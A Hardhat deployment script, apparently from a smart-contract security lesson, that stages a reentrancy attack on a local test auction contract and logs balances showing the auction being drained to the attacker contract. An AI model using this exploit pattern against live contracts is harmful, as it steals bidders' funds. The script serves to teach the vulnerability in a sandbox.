import hre, { ethers } from 'hardhat';

async function main() {
  const [bidder1, bidder2, hacker] = await ethers.getSigners();
  // Разворачиваем контракты аукциона и атаки
  // от лица бидера и хакера соответственно
  const ReentrancyAuction = await ethers.getContractFactory(
    'ReentrancyAuction',
    bidder1
  );
  const auction = await ReentrancyAuction.deploy();
  await auction.waitForDeployment();

  const ReentrancyAttack = await ethers.getContractFactory(
    'ReentrancyAttack',
    hacker
  );
  const attack = await ReentrancyAttack.deploy(auction.target);
  await attack.waitForDeployment();

  // делаем ставки от лиц бидера 1 и 2
  const txBid = await auction
    .connect(bidder1)
    .bid({ value: ethers.parseEther('4.0') });
  await txBid.wait();

  const txBid2 = await auction
    .connect(bidder2)
    .bid({ value: ethers.parseEther('8.0') });
  await txBid2.wait();

  // на контракте сейчас 12 эфиров

  // от лица аттакующего контракта делаем ставку
  const txBid3 = await attack
    .connect(hacker)
    .proxyBid({ value: ethers.parseEther('1.0') });
  await txBid3.wait();

  // на контракте сейчас 13 эфиров
  console.log(
    'Auction balance',
    await ethers.provider.getBalance(auction.target)
  );

  // возвращаем 1 эфир и идем в рекурсию и сосем последние 12 эфиров
  const doAttack = await attack.connect(hacker).attack();
  await doAttack.wait();

  console.log(
    'Auction balance',
    await ethers.provider.getBalance(auction.target)
  );
  console.log(
    'Attacker balance',
    await ethers.provider.getBalance(attack.target)
  );
  console.log(
    'Bidder2 balance',
    await ethers.provider.getBalance(bidder2.address)
  );
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
